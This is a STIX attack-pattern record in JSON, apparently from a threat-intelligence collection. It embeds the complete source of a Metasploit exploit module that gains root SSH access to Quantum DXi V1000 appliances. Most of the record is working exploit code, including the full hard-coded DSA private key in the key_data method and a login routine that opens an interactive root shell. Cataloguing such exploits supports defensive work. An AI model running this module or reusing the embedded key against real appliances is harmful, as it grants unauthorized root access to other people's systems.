{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--60e13c6f-509a-4e38-b8ed-c7587fc592ab",
    "created": "2024-08-14T16:58:21.160491Z",
    "modified": "2024-08-14T16:58:21.160495Z",
    "name": "Quantum DXi V1000 SSH Private Key Exposure",
    "description": " Quantum ships a public/private key pair on DXi V1000 2.2.1 appliances that allows passwordless authentication to any other DXi box. Since the key is easily retrievable, an attacker can use it to gain unauthorized remote access as root.  'Platform' => 'unix' 'Arch' => ARCH_CMD 'Privileged' => true 'Targets' => [ [ 'Universal', {} ] ] 'Payload' => { 'Compat' => { 'PayloadType' => 'cmd_interact' 'ConnectionType' => 'find'  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/ssh/quantum_dxi_known_privkey.rb",
            "external_id": "quantum_dxi_known_privkey.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'net/ssh'\nrequire 'net/ssh/command_stream'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::SSH\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'Quantum DXi V1000 SSH Private Key Exposure',\n          'Description' => %q{\n            Quantum ships a public/private key pair on DXi V1000 2.2.1 appliances that\n            allows passwordless authentication to any other DXi box. Since the key is\n            easily retrievable, an attacker can use it to gain unauthorized remote\n            access as root.\n          },\n          'Platform' => 'unix',\n          'Arch' => ARCH_CMD,\n          'Privileged' => true,\n          'Targets' => [ [ 'Universal', {} ] ],\n          'Payload' => {\n            'Compat' => {\n              'PayloadType' => 'cmd_interact',\n              'ConnectionType' => 'find'\n            }\n          },\n          'Author' => 'xistence <xistence[at]0x90.nl>', # Discovery, Metasploit module\n          'License' => MSF_LICENSE,\n          'References' => [\n            ['PACKETSTORM', '125755']\n          ],\n          'DisclosureDate' => '2014-03-17',\n          'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/interact' },\n          'DefaultTarget' => 0,\n          'Notes' => {\n            'Stability' => [CRASH_SAFE],\n            'Reliability' => [REPEATABLE_SESSION],\n            'SideEffects' => []\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        # Since we don't include Tcp, we have to register this manually\n        Opt::RHOST(),\n        Opt::RPORT(22)\n      ], self.class\n    )\n\n    register_advanced_options(\n      [\n        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),\n        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])\n      ]\n    )\n  end\n\n  # helper methods that normally come from Tcp\n  def rhost\n    datastore['RHOST']\n  end\n\n  def rport\n    datastore['RPORT']\n  end\n\n  def do_login(user)\n    opt_hash = ssh_client_defaults.merge({\n      auth_methods: ['publickey'],\n      port: rport,\n      key_data: [ key_data ]\n    })\n\n    opt_hash.merge!(verbose: :debug) if datastore['SSH_DEBUG']\n    begin\n      ssh_socket = nil\n      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do\n        ssh_socket = Net::SSH.start(rhost, user, opt_hash)\n      end\n    rescue Rex::ConnectionError\n      return nil\n    rescue Net::SSH::Disconnect, ::EOFError\n      print_error \"#{rhost}:#{rport} SSH - Disconnected during negotiation\"\n      return nil\n    rescue ::Timeout::Error\n      print_error \"#{rhost}:#{rport} SSH - Timed out during negotiation\"\n      return nil\n    rescue Net::SSH::AuthenticationFailed\n      print_error \"#{rhost}:#{rport} SSH - Failed authentication\"\n      return nil\n    rescue Net::SSH::Exception => e\n      print_error \"#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}\"\n      return nil\n    end\n\n    if ssh_socket\n\n      # Create a new session from the socket, then dump it.\n      conn = Net::SSH::CommandStream.new(ssh_socket)\n      ssh_socket = nil\n\n      return conn\n    else\n      return nil\n    end\n  end\n\n  def exploit\n    conn = do_login('root')\n    if conn\n      print_good \"#{rhost}:#{rport} - Successful login\"\n      handler(conn.lsock)\n    end\n  end\n\n  def key_data\n    <<~EOF\n      -----BEGIN DSA PRIVATE KEY-----\n      MIIBugIBAAKBgQCEgBNwgF+IbMU8NHUXNIMfJ0ONa91ZI/TphuixnilkZqcuwur2\n      hMbrqY8Yne+n3eGkuepQlBBKEZSd8xPd6qCvWnCOhBqhkBS7g2dH6jMkUl/opX/t\n      Rw6P00crq2oIMafR4/SzKWVW6RQEzJtPnfV7O3i5miY7jLKMDZTn/DRXRwIVALB2\n      +o4CRHpCG6IBqlD/2JW5HRQBAoGAaSzKOHYUnlpAoX7+ufViz37cUa1/x0fGDA/4\n      6mt0eD7FTNoOnUNdfdZx7oLXVe7mjHjqjif0EVnmDPlGME9GYMdi6r4FUozQ33Y5\n      PmUWPMd0phMRYutpihaExkjgl33AH7mp42qBfrHqZ2oi1HfkqCUoRmB6KkdkFosr\n      E0apJ5cCgYBLEgYmr9XCSqjENFDVQPFELYKT7Zs9J87PjPS1AP0qF1OoRGZ5mefK\n      6X/6VivPAUWmmmev/BuAs8M1HtfGeGGzMzDIiU/WZQ3bScLB1Ykrcjk7TOFD6xrn\n      k/inYAp5l29hjidoAONcXoHmUAMYOKqn63Q2AsDpExVcmfj99/BlpQIUYS6Hs70u\n      B3Upsx556K/iZPPnJZE=\n      -----END DSA PRIVATE KEY-----\n    EOF\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-03-17"
}